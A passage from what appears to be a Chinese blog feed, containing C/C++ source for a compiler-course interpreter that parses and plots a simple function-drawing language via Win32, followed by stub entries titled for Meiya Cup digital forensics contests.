hDC<span class="token punctuation">;</span><span class="token keyword">extern</span> <span class="token keyword">double</span>Parameter<span class="token punctuation">,</span><span class="token comment">//参数T的存储空间：记录t每次加一点的变化   在语法分析中声明的</span>Origin_x<span class="token punctuation">,</span> Origin_y<span class="token punctuation">,</span><span class="token comment">//横纵坐标平移距离</span>Scale_x<span class="token punctuation">,</span> Scale_y<span class="token punctuation">,</span><span class="token comment">//横纵比例因子</span>Rot_angle<span class="token punctuation">;</span><span class="token comment">//旋转角度</span><span class="token keyword">double</span> <span class="token function">GetExprValue</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span> root<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获得表达式的值</span><span class="token keyword">void</span> <span class="token function">DrawPixel</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> x<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//绘制一个点</span><span class="token keyword">void</span> <span class="token function">DrawLoop</span><span class="token punctuation">(</span><span class="token keyword">double</span> Start<span class="token punctuation">,</span><span class="token keyword">double</span> End<span class="token punctuation">,</span><span class="token keyword">double</span> Step<span class="token punctuation">,</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>HorPtr<span class="token punctuation">,</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>VerPtr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//图形绘制</span><span class="token keyword">void</span> <span class="token function">DelExprTree</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除一棵树</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Errmsg</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>string<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//出错处理</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">CalcCoord</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>Hor_Exp<span class="token punctuation">,</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>Ver_Exp<span class="token punctuation">,</span><span class="token keyword">double</span> <span class="token operator">&amp;</span>Hor_x<span class="token punctuation">,</span><span class="token keyword">double</span> <span class="token operator">&amp;</span>Ver_y<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//计算点的坐标</span>   <span class="token comment">//----------出错处理</span><span class="token keyword">void</span> <span class="token function">Errmsg</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>string<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token comment">//----------计算被绘制点的坐标</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">CalcCoord</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>Hor_Exp<span class="token punctuation">,</span><span class="token comment">//横坐标表达式语法树的根节点</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span> Ver_Exp<span class="token punctuation">,</span><span class="token comment">//纵坐标表达式语法树的根节点</span><span class="token keyword">double</span> <span class="token operator">&amp;</span>Hor_x<span class="token punctuation">,</span><span class="token comment">//点横坐标值，起返回值的作用</span><span class="token keyword">double</span> <span class="token operator">&amp;</span>Ver_y<span class="token punctuation">)</span><span class="token comment">//点纵坐标值，起返回值的作用</span><span class="token punctuation">&#123;</span><span class="token keyword">double</span> HorCord<span class="token punctuation">,</span> VerCord<span class="token punctuation">,</span> Hor_tmp<span class="token punctuation">;</span>HorCord <span class="token operator">=</span> <span class="token function">GetExprValue</span><span class="token punctuation">(</span>Hor_Exp<span class="token punctuation">)</span><span class="token punctuation">;</span>VerCord <span class="token operator">=</span> <span class="token function">GetExprValue</span><span class="token punctuation">(</span>Ver_Exp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//根据表达式的语法树计算原始坐标</span>HorCord <span class="token operator">*=</span> Scale_x<span class="token punctuation">;</span>VerCord <span class="token operator">*=</span> Scale_y<span class="token punctuation">;</span><span class="token comment">//进行比例变换</span>Hor_tmp <span class="token operator">=</span> HorCord <span class="token operator">*</span> <span class="token function">cos</span><span class="token punctuation">(</span>Rot_angle<span class="token punctuation">)</span> <span class="token operator">+</span> VerCord <span class="token operator">*</span> <span class="token function">sin</span><span class="token punctuation">(</span>Rot_angle<span class="token punctuation">)</span><span class="token punctuation">;</span>VerCord <span class="token operator">=</span> VerCord <span class="token operator">*</span> <span class="token function">cos</span><span class="token punctuation">(</span>Rot_angle<span class="token punctuation">)</span> <span class="token operator">-</span> HorCord <span class="token operator">*</span> <span class="token function">sin</span><span class="token punctuation">(</span>Rot_angle<span class="token punctuation">)</span><span class="token punctuation">;</span>HorCord <span class="token operator">=</span> Hor_tmp<span class="token punctuation">;</span><span class="token comment">//进行旋转变换</span>HorCord <span class="token operator">+=</span> Origin_x<span class="token punctuation">;</span>VerCord <span class="token operator">+=</span> Origin_y<span class="token punctuation">;</span><span class="token comment">//进行平移变换</span>Hor_x <span class="token operator">=</span> HorCord<span class="token punctuation">;</span>Ver_y <span class="token operator">=</span> VerCord<span class="token punctuation">;</span><span class="token comment">//返回变换后点的坐标</span><span class="token punctuation">&#125;</span><span class="token comment">//没有返回值</span> <span class="token comment">//----------循环绘制点的坐标</span><span class="token keyword">void</span> <span class="token function">DrawLoop</span><span class="token punctuation">(</span><span class="token keyword">double</span> Start<span class="token punctuation">,</span><span class="token comment">//起始</span><span class="token keyword">double</span> End<span class="token punctuation">,</span><span class="token comment">//终止</span><span class="token keyword">double</span> Step<span class="token punctuation">,</span><span class="token comment">//步长</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>HorPtr<span class="token punctuation">,</span><span class="token comment">//横坐标表达式语法树的根节点</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>VerPtr<span class="token punctuation">)</span><span class="token comment">//纵坐标表达式语法树的根节点</span><span class="token punctuation">&#123;</span><span class="token keyword">extern</span> <span class="token keyword">double</span> Parameter<span class="token punctuation">;</span><span class="token keyword">double</span> x<span class="token punctuation">,</span> y<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>Parameter <span class="token operator">=</span> Start<span class="token punctuation">;</span> Parameter <span class="token operator">&lt;=</span> End<span class="token punctuation">;</span> Parameter <span class="token operator">+=</span> Step<span class="token punctuation">)</span><span class="token comment">//把t在范围内的每一个值带入计算</span><span class="token punctuation">&#123;</span><span class="token function">CalcCoord</span><span class="token punctuation">(</span>HorPtr<span class="token punctuation">,</span> VerPtr<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//计算要绘制店的实际坐标</span><span class="token function">DrawPixel</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>x<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//绘制这个点</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//----------计算表达式的值</span><span class="token keyword">double</span> <span class="token function">GetExprValue</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>root<span class="token punctuation">)</span><span class="token comment">//参数是表达式的根</span><span class="token punctuation">&#123;</span><span class="token comment">//后续遍历语法树  根据不同的节点类型计算当前根节点的值</span><span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0.0</span><span class="token punctuation">;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span>root<span class="token operator">-></span>OpCode<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//二元运算符</span><span class="token keyword">case</span> PLUS<span class="token operator">:</span><span class="token keyword">return</span> <span class="token function">GetExprValue</span><span class="token punctuation">(</span>root<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseOperater<span class="token punctuation">.</span>Left<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token function">GetExprValue</span><span class="token punctuation">(</span>root<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseOperater<span class="token punctuation">.</span>Right<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">case</span> MINUS<span class="token operator">:</span><span class="token keyword">return</span> <span class="token function">GetExprValue</span><span class="token punctuation">(</span>root<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseOperater<span class="token punctuation">.</span>Left<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token function">GetExprValue</span><span class="token punctuation">(</span>root<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseOperater<span class="token punctuation">.</span>Right<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">case</span> MUL<span class="token operator">:</span><span class="token keyword">return</span> <span class="token function">GetExprValue</span><span class="token punctuation">(</span>root<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseOperater<span class="token punctuation">.</span>Left<span class="token punctuation">)</span> <span class="token operator">*</span><span class="token function">GetExprValue</span><span class="token punctuation">(</span>root<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseOperater<span class="token punctuation">.</span>Right<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">case</span> DIV<span class="token operator">:</span><span class="token keyword">return</span> <span class="token function">GetExprValue</span><span class="token punctuation">(</span>root<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseOperater<span class="token punctuation">.</span>Left<span class="token punctuation">)</span> <span class="token operator">/</span><span class="token function">GetExprValue</span><span class="token punctuation">(</span>root<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseOperater<span class="token punctuation">.</span>Right<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">case</span> POWER<span class="token operator">:</span><span class="token keyword">return</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token function">GetExprValue</span><span class="token punctuation">(</span>root<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseOperater<span class="token punctuation">.</span>Left<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">GetExprValue</span><span class="token punctuation">(</span>root<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseOperater<span class="token punctuation">.</span>Right<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">case</span> FUNC<span class="token operator">:</span><span class="token keyword">return</span><span class="token punctuation">(</span><span class="token operator">*</span>root<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseFunc<span class="token punctuation">.</span>MathFuncPtr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">GetExprValue</span><span class="token punctuation">(</span>root<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseFunc<span class="token punctuation">.</span>Child<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">case</span> CONST_ID<span class="token operator">:</span><span class="token keyword">return</span> root<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseConst<span class="token punctuation">;</span><span class="token keyword">case</span> T<span class="token operator">:</span><span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span>root<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseParmPtr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token operator">:</span><span class="token keyword">return</span> <span class="token number">0.0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//返回值是表达式的值</span><span class="token punctuation">&#125;</span><span class="token comment">//----------删除一颗语法树</span><span class="token keyword">void</span> <span class="token function">DelExprTree</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>root<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span>root<span class="token operator">-></span>OpCode<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> PLUS<span class="token operator">:</span><span class="token comment">//二元：：两个孩子的内部节点</span><span class="token keyword">case</span> MINUS<span class="token operator">:</span><span class="token keyword">case</span> MUL<span class="token operator">:</span><span class="token keyword">case</span> DIV<span class="token operator">:</span><span class="token keyword">case</span> POWER<span class="token operator">:</span><span class="token function">DelExprTree</span><span class="token punctuation">(</span>root<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseOperater<span class="token punctuation">.</span>Left<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">DelExprTree</span><span class="token punctuation">(</span>root<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseOperater<span class="token punctuation">.</span>Right<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> FUNC<span class="token operator">:</span><span class="token function">DelExprTree</span><span class="token punctuation">(</span>root<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseFunc<span class="token punctuation">.</span>Child<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//一元：：一个孩子的内部节点</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token operator">:</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">delete</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//----------绘制一个点</span><span class="token keyword">void</span> <span class="token function">DrawPixel</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> x<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> y<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">SetPixel</span><span class="token punctuation">(</span>hDC<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> red<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="main-cpp"><a href="#main-cpp" class="headerlink" title="main.cpp"></a>main.cpp</h4><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">warning</span><span class="token punctuation">(</span>disable<span class="token operator">:</span><span class="token number">4996</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"semantic.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;tchar.h></span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MAX_CHARS</span> <span class="token expression"><span class="token number">200</span></span></span><span class="token keyword">extern</span> HDC hDC<span class="token punctuation">;</span><span class="token comment">// 窗口句柄，全局变量</span><span class="token keyword">char</span> SrcFilePath<span class="token punctuation">[</span>MAX_CHARS<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// 用于存放源程序文件路径</span>TCHAR Name<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">_T</span><span class="token punctuation">(</span><span class="token string">"函数绘图语言解释器"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 窗口名</span><span class="token comment">// 检查源程序文件是否合法函数声明</span><span class="token keyword">static</span> bool <span class="token function">CheckSrcFile</span><span class="token punctuation">(</span>LPSTR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*  Declare Windows procedure  */</span>LRESULT CALLBACK <span class="token function">WindowProcedure</span><span class="token punctuation">(</span>HWND<span class="token punctuation">,</span> UINT<span class="token punctuation">,</span> WPARAM<span class="token punctuation">,</span> LPARAM<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*  Make the class name into a global variable  */</span>TCHAR szClassName<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">_T</span><span class="token punctuation">(</span><span class="token string">"函数绘图语言解释器"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> WINAPI <span class="token function">WinMain</span><span class="token punctuation">(</span>HINSTANCE hThisInstance<span class="token punctuation">,</span>HINSTANCE hPrevInstance<span class="token punctuation">,</span>LPSTR lpszArgument<span class="token punctuation">,</span><span class="token keyword">int</span> nFunsterStil<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>HWND hwnd<span class="token punctuation">;</span>               <span class="token comment">/* This is the handle for our window */</span>MSG messages<span class="token punctuation">;</span>            <span class="token comment">/* Here messages to the application are saved */</span>WNDCLASSEX wincl<span class="token punctuation">;</span>        <span class="token comment">/* Data structure for the windowclass */</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token comment">/*CTestDlg *pDlg;*/</span> <span class="token comment">/* The Window structure */</span>wincl<span class="token punctuation">.</span>hInstance <span class="token operator">=</span> hThisInstance<span class="token punctuation">;</span>wincl<span class="token punctuation">.</span>lpszClassName <span class="token operator">=</span> szClassName<span class="token punctuation">;</span>wincl<span class="token punctuation">.</span>lpfnWndProc <span class="token operator">=</span> WindowProcedure<span class="token punctuation">;</span>      <span class="token comment">/* This function is called by windows */</span>wincl<span class="token punctuation">.</span>style <span class="token operator">=</span> CS_DBLCLKS<span class="token punctuation">;</span>                 <span class="token comment">/* Catch double-clicks */</span>wincl<span class="token punctuation">.</span>cbSize <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>WNDCLASSEX<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* Use default icon and mouse-pointer */</span>wincl<span class="token punctuation">.</span>hIcon <span class="token operator">=</span> <span class="token function">LoadIcon</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> IDI_APPLICATION<span class="token punctuation">)</span><span class="token punctuation">;</span>wincl<span class="token punctuation">.</span>hIconSm <span class="token operator">=</span> <span class="token function">LoadIcon</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> IDI_APPLICATION<span class="token punctuation">)</span><span class="token punctuation">;</span>wincl<span class="token punctuation">.</span>hCursor <span class="token operator">=</span> <span class="token function">LoadCursor</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> IDC_ARROW<span class="token punctuation">)</span><span class="token punctuation">;</span>wincl<span class="token punctuation">.</span>lpszMenuName <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>                 <span class="token comment">/* No menu */</span>wincl<span class="token punctuation">.</span>cbClsExtra <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                      <span class="token comment">/* No extra bytes after the window class */</span>wincl<span class="token punctuation">.</span>cbWndExtra <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                      <span class="token comment">/* structure or the window instance */</span><span class="token comment">/* Use Windows's default color as the background of the window */</span>wincl<span class="token punctuation">.</span>hbrBackground <span class="token operator">=</span> <span class="token punctuation">(</span>HBRUSH<span class="token punctuation">)</span>COLOR_BACKGROUND<span class="token punctuation">;</span><span class="token comment">/* Register the window class, and if it fails quit the program */</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">RegisterClassEx</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>wincl<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">/* The class is registered, let's create the program*/</span>hwnd <span class="token operator">=</span> <span class="token function">CreateWindowEx</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>                   <span class="token comment">/* Extended possibilites for variation */</span>szClassName<span class="token punctuation">,</span>         <span class="token comment">/* Classname */</span><span class="token function">_T</span><span class="token punctuation">(</span><span class="token string">"函数绘图语言解释器"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>       <span class="token comment">/* Title Text */</span>WS_OVERLAPPEDWINDOW<span class="token punctuation">,</span> <span class="token comment">/* default window */</span>CW_USEDEFAULT<span class="token punctuation">,</span>       <span class="token comment">/* Windows decides the position */</span>CW_USEDEFAULT<span class="token punctuation">,</span>       <span class="token comment">/* where the window ends up on the screen */</span><span class="token number">740</span><span class="token punctuation">,</span>                 <span class="token comment">/* The programs width */</span><span class="token number">490</span><span class="token punctuation">,</span>                 <span class="token comment">/* and height in pixels */</span>HWND_DESKTOP<span class="token punctuation">,</span>        <span class="token comment">/* The window is a child-window to desktop */</span><span class="token constant">NULL</span><span class="token punctuation">,</span>                <span class="token comment">/* No menu */</span>hThisInstance<span class="token punctuation">,</span>       <span class="token comment">/* Program Instance handler */</span><span class="token constant">NULL</span>                 <span class="token comment">/* No Window Creation data */</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* Make the window visible on the screen */</span><span class="token function">ShowWindow</span><span class="token punctuation">(</span>hwnd<span class="token punctuation">,</span> nFunsterStil<span class="token punctuation">)</span><span class="token punctuation">;</span>hDC <span class="token operator">=</span> <span class="token function">GetDC</span><span class="token punctuation">(</span>hwnd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* pDlg=new CTestDlg();pDlg->Create(IDD_DIALOG1,this); pDlg->ShowWindow(SW_SHOW);*/</span><span class="token function">strcpy</span><span class="token punctuation">(</span>SrcFilePath<span class="token punctuation">,</span> <span class="token string">"test2.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">CheckSrcFile</span><span class="token punctuation">(</span>SrcFilePath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">// --------------------------------------------</span><span class="token comment">//调用绘图语言解释器</span><span class="token function">Parser</span><span class="token punctuation">(</span>SrcFilePath<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// --------------------------------------------</span><span class="token comment">/* Run the message loop. It will run until GetMessage() returns 0 */</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">GetMessage</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>messages<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">/* Translate virtual-key messages into character messages */</span><span class="token function">TranslateMessage</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>messages<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* Send message to WindowProcedure */</span><span class="token function">DispatchMessage</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>messages<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* The program return-value is 0 - The value that PostQuitMessage() gave */</span><span class="token keyword">return</span> messages<span class="token punctuation">.</span>wParam<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/*  This function is called by the Windows function DispatchMessage()  */</span>LRESULT CALLBACK <span class="token function">WindowProcedure</span><span class="token punctuation">(</span>HWND hwnd<span class="token punctuation">,</span> UINT message<span class="token punctuation">,</span> WPARAM wParam<span class="token punctuation">,</span> LPARAM lParam<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span>message<span class="token punctuation">)</span>                  <span class="token comment">/* handle the messages */</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> WM_DESTROY<span class="token operator">:</span><span class="token function">PostQuitMessage</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">/* send a WM_QUIT to the message queue */</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token operator">:</span>                      <span class="token comment">/* for messages that we don't deal with */</span><span class="token keyword">return</span> <span class="token function">DefWindowProc</span><span class="token punctuation">(</span>hwnd<span class="token punctuation">,</span> message<span class="token punctuation">,</span> wParam<span class="token punctuation">,</span> lParam<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 检查源程序文件是否合法函数实现</span>bool <span class="token function">CheckSrcFile</span><span class="token punctuation">(</span>LPSTR lpszCmdParam<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>FILE <span class="token operator">*</span> file <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>lpszCmdParam<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">MessageBoxA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">"未指定源程序文件 !"</span><span class="token punctuation">,</span> <span class="token string">"错误"</span><span class="token punctuation">,</span> MB_OK<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> false<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>file <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>lpszCmdParam<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">MessageBoxA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">"打开源程序文件出错 !"</span><span class="token punctuation">,</span> <span class="token string">"错误"</span><span class="token punctuation">,</span> MB_OK<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MessageBoxA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> lpszCmdParam<span class="token punctuation">,</span> <span class="token string">"文件名"</span><span class="token punctuation">,</span> MB_OK<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> false<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token function">fclose</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> true<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>发扬开源精神方便后人，如果对你有用，hxd点点fork吧<br><a href="https://github.com/topK-li/Compilers-SimpleFunctionDrawingLanguageInterpreter">完整项目源码</a></p>]]></content>
      
      
      <categories>
          
          <category> 作业 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> 编译原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019美亚杯个人赛</title>
      <link href="/2020/11/13/2019-mei-ya-bei-ge-ren-sai/"/>
      <url>/2020/11/13/2019-mei-ya-bei-ge-ren-sai/</url>
      
        <content type="html"><![CDATA[<p><em>由于版权原因，本文涉及的工具、镜像均不提供下载。</em><br><img src="/images/2020/11/13/76d31d1d-977d-4188-979c-f45f15f9e6f4.png"></p><span id="more"></span><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p><img src="/images/2020/11/13/ff5fd16a-fb1e-4d52-9352-565e7fe1bd6f.png"></p>]]></content>
      
      
      <categories>
          
          <category> 电子取证 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 电子取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018美亚杯个人赛</title>
      <link href="/2020/11/12/2018-mei-ya-bei-ge-ren-sai/"/>
      <url>/2020/11/12/2018-mei-ya-bei-ge-ren-sai/</url>
      
